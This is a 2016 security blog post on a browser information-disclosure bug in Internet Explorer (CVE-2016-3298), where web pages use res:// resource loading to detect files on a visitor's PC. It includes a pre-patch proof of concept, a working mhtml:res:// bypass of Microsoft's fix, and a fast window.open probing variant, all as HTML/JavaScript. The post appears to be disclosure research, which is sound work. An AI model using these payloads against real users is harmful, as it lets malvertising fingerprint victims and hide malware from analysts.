<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="alternate icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Astro v5.16.6"><title>Detecting Local Files to Evade Analysts (IE)</title><meta name="description" content><link rel="canonical" href="https://www.brokenbrowser.com/blog/detecting-local-files-to-evade-analysts/"><meta property="og:title" content="Detecting Local Files to Evade Analysts (IE)"><meta property="og:description" content><meta property="og:type" content="website"><meta property="og:url" content="https://www.brokenbrowser.com/blog/detecting-local-files-to-evade-analysts/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Detecting Local Files to Evade Analysts (IE)"><meta name="twitter:description" content><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.xml"><link rel="stylesheet" href="/_astro/_slug_.D8CnJWvD.css"></head> <body> <div class="container center"> <header class="header"> <div class="header__inner"> <div class="header__logo"> <a href="/"> <div class="logo">
MagicMac Labs
</div> </a> </div> <ul class="menu menu--mobile"> <li class="menu__trigger">Menu ▾</li> <li> <ul class="menu__dropdown"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </li> </ul> </div> <nav class="navigation-menu"> <ul class="navigation-menu__inner menu--desktop"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </nav> </header> <main class="content">  <article> <h1 class="post-title">Detecting Local Files to Evade Analysts (IE)</h1> <div class="post-meta"> <time> <time datetime="2016-10-18T00:00:00.000Z"> 2016-10-18 </time> </time> <span class="post-category"> :: browser-workshop</span>  </div>  <div class="post-content">  <p>Last month we’ve been looking at <a href="../detecting-apps-mimetype-malware/">how attackers were targeting unsavvy users by checking the associated mimeTypes to applications on the system</a>. If the PC had analyst tools installed, something detected from withing the browser, then the malware refused to download the bad bits staying below the radars for a longer period of time. The vendor patched the bug but unfortunately bypassing it is quite easy by just combining what attackers already have.</p>
<p>Today we are going to work with another fingerprinting bug which allows attackers to check the presence of files in our PCs. <a href="https://www.proofpoint.com/us/threat-insight/post/microsoft-patches-CVE-2016-3298-second-information-disclosure-zero-day">According to the fellows at Proofpoint</a>, Microsoft finally patched this information disclosure bug which was being used in different malvertising campaigns and exploit kits. If you have no idea about this, let me recap in two lines:</p>
<p><a href="https://www.proofpoint.com/us/threat-insight/post/massive-adgholas-malvertising-campaigns-use-steganography-and-file-whitelisting-to-hide-in-plain-sight">Proofpoint discovered</a> at least two information disclosure bugs (<a href="https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3351">CVE-2016-3351</a>, <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3298">CVE-2016-3298</a>) exploited on the wild which were reported to Microsoft between October and December of 2015. Microsoft patched CVE-2016-3351 (mimeType disclosure) in September 2016 and CVE-2016-3298 (file existence check) in October 2016. Unfortunately both patches were bypassed in less than a day.</p>
<p>The <a href="https://technet.microsoft.com/en-us/library/security/ms16-118.aspx">vendor claims</a> users need to navigate to a malicious site, but it is not really the case. Both bugs were found in <a href="http://arstechnica.com/security/2016/03/big-name-sites-hit-by-rash-of-malicious-ads-spreading-crypto-ransomware/">banners running in mainstream sites</a>. Today with all these malvertising campaigns there’s no need to convince the user to go to an evil site.</p>
<p><img src="/images/2016/10/00-CVE-2016-3298-vendor.png" alt=""></p>
<p>Anyway, let’s get started. We will first study one of the techniques that attackers are using, test it with the patch, and and finally bypass it again. In fact, we will be nice fellows and take the road less traveled by finding a <em>variation</em> and not a completely different route to achieve our goal. This means that we will be using something pretty similar to what attackers are doing now and not anything new. If we employ a completely different technique, it would be perfectly valid but then we shouldn’t be calling this a bypass but just a new way to achieve the same old thing: detecting the presence of local files.</p>
<h2 id="how-attackers-exploited-cve-2016-3298">How Attackers Exploited CVE-2016-3298</h2>
<p>There is a well known method to detect the presence of binary files (exe, dll, cpl, etc) by loading their internal resources and checking if events like onload/onreadystate/onerror fire. Essentially, IE uses internal resources to load information pages, error messages, and even icons. Those resources are embedded inside binary files, but can be loaded separately with no problems.</p>
<p>The most basic example is the error page that IE renders when we attempt to load an invalid URL. For example, if we type <strong><a href="http://invalidsite">http://invalidsite</a></strong> in the address bar, IE will show us this error page:</p>
<p><img src="/images/2016/10/01-invalid-site.png" alt="Invalid Site"></p>
<p>In the address bar we can read <strong><a href="http://invalidsite/">http://invalidsite/</a></strong> but the browser has rendered an error page which is obviously not coming from that site. Let’s find out the real URL by checking its properties: right click anywhere on the page and select “Properties” from the context menu to reveal the truth.</p>
<p><img src="/images/2016/10/02-real-url.png" alt="Real URL"></p>
<h2 id="loading-resources">Loading Resources</h2>
<p>As we can see, the content is really coming from <strong>res://ieframe.dll/dnserror.htm</strong>#<a href="http://invalidsite/">http://invalidsite/</a> where “res:” stands for resource and is the way IE has to load internal resources from binary files. The format is very simple: res://resourcefile.ext/resourceitem. By default the browser assumes the resource file is in windows/system32, but we can set the full path to any file on the system. For example, if we have Fiddler installed we could simply find a valid resource from one of its files and render it on IE. Then, the readystate event will inform us if the resource was loaded or not.</p>
<p>If we use a tool like the free <a href="http://www.angusj.com/resourcehacker/">Resource Hacker</a>, we can openly read the resource names/content and load them later as images, html files, etc. Check out how the embedded dnserror.htm is uncovered by Resource Hacker.</p>
<p><img src="/images/2016/10/03-resource-hacker.png" alt="Resource Hacker"></p>
<p><em>Note: we loaded ieframe.dll.mui in Resource Hacker because ieframe.dll takes some of its resources from that file, however most binary files load the resources from themselves so we can just drop the file in resource hacker and find everything immediately.</em></p>
<p>In fact, we don’t even need resource hacker to find a valid resource, because there are default resources in all binary files that have <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms648009(v=vs.85).aspx">constant values which never change</a>. For example, the <em>file information</em> of all binary files can be found in the resource <strong>/16/1</strong> (16 == RT_VERSION). To be clear, it’s easier for us to load a default resource than having to go over every file that we want to test. For example, in Fiddler (or any binary file) we can easily render the default information text which conveniently fires a readystatechange event.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">res</span><span style="color:var(--astro-code-token-punctuation)">:</span><span style="color:var(--astro-code-token-comment)">//c:\Program Files (x86)\Fiddler2\Fiddler.exe/16/1</span></span></code></pre>
<p><img src="/images/2016/10/04-fiddler-res.png" alt=""></p>
<h2 id="poc-before-the-patch">PoC Before the Patch</h2>
<p>To exploit this bug, we should load the resource inside an iFrame and count how many times the onreadystate event fires. If it fires once the file exists, two it does not. Don’t waste your time trying to get the states (loading, complete, etc) of the <a href="https://msdn.microsoft.com/en-us/library/ms536957(v=vs.85).aspx">readystate event</a> because that’s not unreliable. Counting is 100% sure fire: one event fired == exists, two events == does not exist.</p>
<p>Here’s the code, but you can <a href="https://goo.gl/4vW2U3">download a working PoC</a> (password: infected) if you prefer. I’m not placing it live because my hosting detects it as a virus, and who wants to fight with a <a href="https://www.hostwithlove.com/">hosting named HostWithLove</a>? No way! =)</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">iframe</span><span style="color:var(--astro-code-token-function)"> src</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">"res://c:\Program Files (x86)\Fiddler2\Fiddler.exe/16/1"</span><span style="color:var(--astro-code-token-function)"> onreadystatechange</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">"count++"</span><span style="color:var(--astro-code-foreground)">>&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">iframe</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">count </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-foreground)">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// This onload gives the iFrame a bit of time to load.</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// But has nothing to do with the method itself</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-foreground)">.</span><span style="color:var(--astro-code-token-function)">onload</span><span style="color:var(--astro-code-token-keyword)"> =</span><span style="color:var(--astro-code-token-keyword)"> function</span><span style="color:var(--astro-code-foreground)">()</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">{</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">  if</span><span style="color:var(--astro-code-foreground)"> (count </span><span style="color:var(--astro-code-token-keyword)">==</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-foreground)">) </span><span style="color:var(--astro-code-token-function)">alert</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"File exists!"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">  else</span><span style="color:var(--astro-code-token-function)"> alert</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"File does not exist"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">}</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"></span></code></pre>
<p>The PoC above worked until last week but <a href="https://technet.microsoft.com/en-us/library/security/ms16-118.aspx">Microsoft patched it</a> so we need to work around a variation. IE still allows internal resources to be loaded (for example, from ieframe.dll) so the URL <strong>res://ieframe.dll/16/1</strong> works because it is considered an internal resource, but we can’t do the same with other files. In fact, if we disassemble IE we will find a string comparison against ieframe.dll that does not even consider the full path to the file, so if we try to load a valid resources from res://c:\windows\system32\ieframe.dll/16/1 it will also fail.</p>
<p>It seems that developers got inspired by <a href="https://twitter.com/jeromesegura">Jérôme Segura’s</a> post, where <a href="https://blog.malwarebytes.com/cybercrime/exploits/2016/08/browser-based-fingerprinting-implications-and-mitigations/">he describes possible mitigations</a> and even if I believe the fix is good, it did not consider alternatives. One thing is to patch a buffer overflow where you can get away by changing a line of code, but a different thing is a design bug which needs to be tested from different perspectives.</p>
<p>Anyway, we know that IE refuses to load interesting files using the res: protocol, so what can we do? First, let’s take a look at the attackers code. Sorry if the picture below is pixelated, <a href="https://www.proofpoint.com/sites/default/files/ms0-fig1.png">it’s a graphic that I took</a> from the <a href="https://www.proofpoint.com/us/threat-insight/post/microsoft-patches-CVE-2016-3298-second-information-disclosure-zero-day">impressive Proofpoint research</a> and zoomed it a bit to make it clearer for us. Yellow is mine.</p>
<p><img src="/images/2016/10/05-proofpoint.png" alt=""></p>
<h2 id="finding-a-variation">Finding a Variation</h2>
<p>The malware authors are using three different techniques here to detect the presence of local files, but all of them are patched now. Either way, the first thing that called my attention was the <code>mhtml:file</code> because even if the file: protocol is <em>apparently</em> disabled on IE, the mhtml still works. I think I’ve been influenced by a <a href="http://insert-script.blogspot.com.ar/2016/02/mhtml-x-usc-feature-from-past.html">great post</a> from <a href="https://twitter.com/insertScript">Alex (insertScript)</a> which I read a month ago, so as soon as I sumbled upon the mhtml protocol in the attackers code, I got the idea of combining <code>mhtml</code> with <code>res</code>.To be clear, we are going to mix two methods that don’t work anymore by themselves, hoping that the mix will create something useful out of them.</p>
<p>So neither <code>mhtml:file:</code> or <code>res://</code> work now. But what would happen if we mix them together? <code>mhtml:res://</code></p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">iframe</span><span style="color:var(--astro-code-token-function)"> src</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">"mhtml:res://c:\Program Files (x86)\Fiddler2\Fiddler.exe/16/1"</span><span style="color:var(--astro-code-token-function)"> onload</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">"count</span><span style="color:var(--astro-code-token-keyword)">++</span><span style="color:var(--astro-code-token-string-expression)">"</span><span style="color:var(--astro-code-foreground)">>&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">iframe</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">count </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-foreground)">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-foreground)">.</span><span style="color:var(--astro-code-token-function)">onload</span><span style="color:var(--astro-code-token-keyword)"> =</span><span style="color:var(--astro-code-token-keyword)"> function</span><span style="color:var(--astro-code-foreground)">()</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">{</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">  if</span><span style="color:var(--astro-code-foreground)"> (count </span><span style="color:var(--astro-code-token-keyword)">==</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-foreground)">) </span><span style="color:var(--astro-code-token-function)">alert</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"File exists!"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">  else</span><span style="color:var(--astro-code-token-function)"> alert</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"File does not exist"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">}</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span></span></code></pre>
<p><img src="/images/2016/10/06-CVE-2016-3298-mhtml-bypass.png" alt=""></p>
<p>Update 2016-10-24: yet another variation of the same thing, but simpler: <a href="https://drive.google.com/file/d/1ANYSKxXOgapZZIpbX9ws3tXps80i896a/view?usp=sharing">PoC CVE-2013-7331 bypass</a>. This is a trivial bypass of the XMLDom version widely used in exploit kits.</p>
<p>It seems attackers will continue fingerprinting us regardless of the patch. The variation was easy but taking a closer look we can see that onreadystatechange was replaced by onload, because the former didn’t fire. On the other hand, IE failed to render the resource the first time that loaded it, so we are now setting the iFrame location twice using the exact same mhtml:res URL.</p>
<p>Clearly attackers will find their way again and again until this bug is patched all around, completely. If we take a look at the times this bug resurfaced in the past we can know in advance that the bad guys are not tired of trying. For example, here we have two other versions of the same vulnerability with slight variations: CVE-2013-7331 and CVE-2015-2413, both exploited in the past and for sure there are more.</p>
<p>I personally stopped here because we are doing it for fun, to learn and share, and hopefully to make my friends at Microsoft <a href="../on-patching-security-bugs/">change their minds</a> on the priority of these vulnerabilities. But attackers won’t stop here, they will keep finding more tricks (backup-ups of the same thing) to be ready after a new patch. See how it works? Attackers are ahead of us with more variations of the same thing, while we are still dealing with ~year old versions of this vulnerability.</p>
<h2 id="final-thoughts-and-details">Final thoughts and details</h2>
<p>If you are interested to go deeper into the bits of the patch, an interesting starting point would be to check both <code>COmWindowProxy::CanNavigateToUriWithZoneCheck</code> and <code>IsIEResourcePage</code> from mshtml.dll.</p>
<p>If you prefer to go with pure JavaScript let me suggest you to set the location of the iframe using the <code>window.open</code> method instead of <code>iframe.location</code>. Setting it with the regular location/location.href will make IE gracefully refuse to load the resource (rendering an about:blank instead). However, using <code>window.open("res://something", "iframename")</code> will throw a convenient access denied error letting us use a try/catch to fuzz it properly without the need to wait for the iframe to change its URL (and wait for an onload).</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">iframe</span><span style="color:var(--astro-code-token-function)"> name</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">"ifr"</span><span style="color:var(--astro-code-foreground)">>&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">iframe</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// No errors, about:blank loaded in iFrame, very slow.</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">ifr</span><span style="color:var(--astro-code-foreground)">.location </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)"> "res://testing.dll"</span><span style="color:var(--astro-code-foreground)">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// Access Denied, nothing changes in the iFrame, super-fast.</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"res://testing.dll"</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> "ifr"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// This last option can be used with a try/catch creating</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// a battery of tests that will immediately return</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// the result.</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span></span></code></pre>
<p>Have a nice day!</p>
<p><a href="https://twitter.com/magicmac2000">Manuel</a></p> <div class="pagination"> <div class="pagination__title"> <span class="pagination__title-h">Read other posts</span> <hr> </div> <div class="pagination__buttons">  <a href="/blog/on-patching-security-bugs/" class="button inline prev">
&lt; [On Patching Security Bugs]
</a> <span>::</span> <a href="/blog/loading-insecure-content-in-secure-pages/" class="button inline next">
[Bypassing Mixed Content Warnings - Loading Insecure Content in Secure Pages (Edge/IE)] &gt;
</a> </div> </div>  </div> </article> <script type="module">document.addEventListener("DOMContentLoaded",()=>{document.querySelectorAll("pre.astro-code").forEach(t=>{const n=document.createElement("div");n.className="highlight",t.parentNode?.insertBefore(n,t),n.appendChild(t);const a=t.getAttribute("data-language")||"text",o=document.createElement("div");if(o.className="code-title",o.textContent=a,navigator.clipboard){const e=document.createElement("button");e.className="copy-button",e.textContent="Copy",e.addEventListener("click",async()=>{const c=t.textContent||"";try{await navigator.clipboard.writeText(c),e.textContent="Copied",setTimeout(()=>{e.textContent="Copy"},1e3)}catch(r){console.error("Failed to copy:",r)}}),o.appendChild(e)}n.insertBefore(o,t)})});</script>  <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>  </main> <footer class="footer"> <div class="footer__inner"> <div class="copyright"> <span>© 2026 MagicMac Labs</span> </div> </div> </footer> </div> <script type="module">(()=>{const s=document.querySelector(".container"),o=document.querySelectorAll(".menu");document.body.addEventListener("click",()=>{o.forEach(e=>{e.classList.contains("open")&&e.classList.remove("open")})}),window.addEventListener("resize",()=>{o.forEach(e=>{e.classList.remove("open")})}),o.forEach(e=>{const i=e.querySelector(".menu__trigger"),t=e.querySelector(".menu__dropdown");i&&t&&(i.addEventListener("click",n=>{n.stopPropagation(),e.classList.contains("open")?e.classList.remove("open"):(o.forEach(c=>c.classList.remove("open")),e.classList.add("open")),s&&t.getBoundingClientRect().right>s.getBoundingClientRect().right&&(t.style.left="auto",t.style.right="0")}),t.addEventListener("click",n=>n.stopPropagation()))})})();</script> </body> </html> 